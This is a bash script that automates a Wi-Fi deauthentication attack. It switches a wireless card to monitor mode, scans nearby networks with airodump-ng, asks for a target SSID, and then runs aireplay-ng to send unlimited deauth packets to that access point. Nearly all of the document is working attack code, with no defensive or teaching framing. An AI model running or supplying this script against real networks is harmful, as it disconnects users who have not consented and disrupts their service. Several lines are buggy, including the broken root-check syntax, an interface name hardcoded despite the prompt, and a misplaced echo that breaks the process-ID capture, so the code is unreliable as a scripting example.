
#!/bin/bash
if ["$EUID" -ne 0]; then 
	echo "run as root"
	exit 
fi

echo "Avaliable Network Interfaces: "
echo ""
ip link show | grep -oP '(?<=: )\w+(?=:)'
echo -n "Enter the wireless interface name "
read INTERFACE 
MONITOR_MODE_INTERFACE="${INTERFACE}" 

echo "Fixing ISSUE-1 this will take 9 seconds" 
#RECMON/*
ip link set wlan0 down
sleep 1
iw wlan0 set type managed
sleep 1
ip link set wlan0 up
sleep 1
systemctl restart NetworkManager
sleep 5
#RECMON*/
 
echo "Starting Monitor Mode on $INTERFACE" 
#ALTMON/*
ip link set wlan0 down
sleep 1
iw wlan0 set type monitor
sleep 1
ip link set wlan0 up
sleep 1
iwconfig
#ALTMON*/

echo "Scanning for Networks"
airodump-ng $MONITOR_MODE_INTERFACE -w /tmp/networks --output-format csv &
echo "test"

AIRDUMP_PID=$! 
sleep 10 
kill $AIRDUMP_PID 
echo "Available Networks:"
latest_file=$(ls /tmp/networks-*.csv | sort -V | tail -n 1)
cat $latest_file # to get the latest record

echo -n "Target SSID: "
echo ""
read TARGET_SSID
TARGET_INFO=$(grep "$TARGET_SSID" $latest_file | head -n 1)
BSSID=$(echo $TARGET_INFO | cut -d ',' -f 1)
CHANNEL=$(echo $TARGET_INFO | cut -d ',' -f 4 | tr -d '[:space:]')
if [ -z "$BSSID" ] || [ -z "$CHANNEL" ]; then
    echo "Network not found. Exiting."
    airmon-ng stop $MONITOR_MODE_INTERFACE
    exit 1
fi
echo "Target BSSID: $BSSID"
echo "Target Channel: $CHANNEL"
sleep 10
echo "Setting $MONITOR_MODE_INTERFACE to channel $CHANNEL"
iwconfig $MONITOR_MODE_INTERFACE channel $CHANNEL
sleep 2
echo "Sending deauth packets to $BSSID..."
aireplay-ng --deauth 0 -a $BSSID $MONITOR_MODE_INTERFACE
sleep 60

echo "Deauth attack terminated, if you want it to last more change the sleep command in line 69 (DEFAULT is sleep 60)" 
echo "Switching the interface to managed mode" 
#RECMON
ip link set wlan0 down
sleep 1
iw wlan0 set type managed
sleep 1
ip link set wlan0 up
sleep 1
systemctl restart NetworkManager
#RECMON
